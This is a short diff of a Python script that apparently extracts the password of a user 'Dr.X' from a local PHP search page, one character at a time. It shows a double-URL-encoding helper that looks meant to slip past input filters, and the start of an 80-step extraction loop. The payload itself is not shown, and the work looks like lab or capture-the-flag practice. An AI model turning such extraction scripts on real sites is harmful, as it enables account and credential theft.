@@ -1,14 +1,10 @@
-import requests, re, string
+import requests
 
 host = "http://localhost:1111/index.php?search="
-alphabet = string.printable
 user = "Dr.X"
 
 def doublequote(s):
 	return ''.join(["%25" + hex(ord(c))[2:] for c in s])
-
-def quote(s):
-	return ''.join(["%" + hex(ord(c))[2:] for c in s])
 
 password = ""
 for i in range(80):
